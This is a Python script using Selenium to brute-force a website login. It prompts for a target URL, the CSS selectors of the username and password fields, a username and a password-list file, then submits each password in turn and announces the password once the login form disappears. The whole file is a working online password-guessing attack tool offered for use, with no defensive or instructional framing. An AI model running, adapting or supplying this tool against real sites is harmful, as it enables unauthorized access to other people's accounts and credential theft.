import time
import os
import selenium
from selenium.webdriver import Chrome
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys

chromedriver_dir = "chromedriver.exe"
website_first_time_open_delay = 5

website_name = input("Enter website name: ")
login_selector = input("Enter login selector: ")
password_selector = input("Enter password selector: ")
while True:
	password_list_name = input("Enter location of password_list: ")
	if(os.path.exists(password_list_name)):
		break
	else:
		print("Location doesn't exist")
password_list_file = open(password_list_name, "r")
password_list = password_list_file.read().splitlines()
password_list_file.close()
login_name = input("Enter username: ")
print("Starting...")
browser = Chrome(chromedriver_dir)
browser.get(website_name)
time.sleep(website_first_time_open_delay)
login_input_field = browser.find_element_by_css_selector(login_selector)
password_input_field = browser.find_element_by_css_selector(password_selector)
while True:
	for x in range(1, len(password_list)):
		login_input_field.send_keys(Keys.CONTROL + "a")
		login_input_field.send_keys(Keys.DELETE)
		password_input_field.send_keys(Keys.CONTROL + "a")
		password_input_field.send_keys(Keys.DELETE)

		login_input_field.send_keys(login_name)
		password_input_field.send_keys(password_list[x])
		password_input_field.submit()
		print(password_list[x])
		try:
			if(True):
				time.sleep(5)
				WebDriverWait(browser, 1).until(EC.presence_of_element_located((By.CSS_SELECTOR, login_selector)))
				WebDriverWait(browser, 1).until(EC.presence_of_element_located((By.CSS_SELECTOR, password_selector)))
			else:
				WebDriverWait(browser, 7).until(EC.presence_of_element_located((By.CSS_SELECTOR, login_selector)))
				WebDriverWait(browser, 7).until(EC.presence_of_element_located((By.CSS_SELECTOR, password_selector)))
		except:
			print("Password found :)")
			print("Password: "+password_list[x])
			while True:
				pass